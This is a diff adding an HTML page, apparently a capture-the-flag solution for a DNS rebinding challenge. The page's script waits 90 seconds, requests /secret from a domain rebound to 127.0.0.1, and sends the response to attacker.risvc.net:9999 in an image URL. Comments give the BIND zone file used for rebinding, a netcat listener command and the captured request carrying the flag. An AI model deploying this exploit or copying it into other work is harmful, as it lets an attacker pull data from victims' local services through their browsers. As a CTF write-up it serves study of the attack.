@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<title>DNS Rebinding Demo</title>
+<body>
+
+	<!-- <script src="http://local.risvc.net:3000/hook.js"></script> -->
+	<!-- This dummy form was from a previous thing -->
+	<form action="store.php" method="POST" name="myform">
+		Username: <input type="text" 	 name="user"> </br>
+		Password: <input type="password" name="pass"> </br> </br>		
+		<input type="Submit" value="Submit Me!">
+	</form>
+
+
+	<script>
+	// local2.risvc.net and local3.risvc.net point to the same attacker's domain
+	//
+	// after 30 seconds (TTL expires after 9 seconds), do a request on the same domain.
+	// but this time, the connection will be on 127.0.0.1 and not on attacker's server,
+	// so we can request files from local host. On the attacker's side, we set up a 
+	// netcat listenter: nc -nvvl -p9999
+	//
+	// /etc/bind/db.risvc.net:
+	//
+	// $TTL    9
+	// @       IN      SOA     myns.risvc.net. root.risvc.net. (
+	//                                 4         ; Serial
+	//                                 9         ; Refresh
+	//                                 9         ; Retry
+	//                                 9         ; Expire
+	//                                 9 )       ; Negative Cache TTL
+	// ;
+	//                 IN      NS      myns.risvc.net.
+	//                 IN      MX      9 mail.risvc.net.
+	// myns            IN      A       52.86.7.190    
+	// mail            IN      A       52.86.7.190
+	// local           IN      A       192.168.1.102
+	// 
+	// ; When victim visits local2.risvc.net for first time, we return 192.168.1.102
+	// ; Once victim gets connected we change local2 record and we restart DNS, so
+	// ; the next query for local2.risvc.net will return 127.0.0.1
+	// local2          IN      A       192.168.1.102
+	// ;local2         IN      A       127.0.0.1
+	// 
+	// 
+	// attacker        IN      A       192.168.1.102
+	//
+	//
+	// After a while we can see the file on the netcat:
+	// root@nogirl:~# nc -nvvl -p 9999
+	// 		listening on [any] 9999 ...
+	// 		connect to [192.168.1.102] from (UNKNOWN) [192.168.1.101] 50876
+	// 		GET /?file=0ctf{monkey_likes_banananananananaaaa} HTTP/1.1
+	// 		Host: attacker.risvc.net:9999
+	// 		Connection: keep-alive
+	// 		User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
+	// 		Accept: image/webp,image/*,*/*;q=0.8
+	// 		Referer: http://local2.risvc.net:8080/play/dns_rebind.html
+	// 		Accept-Encoding: gzip, deflate, sdch
+	// 		Accept-Language: el-GR,el;q=0.8
+	//
+		setTimeout(function() { 
+			document.body.innerHTML += "</br>Time's up!"
+
+			var xhr = new XMLHttpRequest();
+			xhr.onreadystatechange = function() 
+			{
+				if( xhr.readyState == XMLHttpRequest.DONE ) 
+				{
+					var image = new Image();
+			        image.src = "http://attacker.risvc.net:9999/?file=" + xhr.responseText
+
+				}
+			}
+
+			xhr.open('GET', 'http://local2.risvc.net:8080/secret');
+			xhr.send();
+
+	}, 90*1000)
+
+	</script>
+
+</body>
+</html>
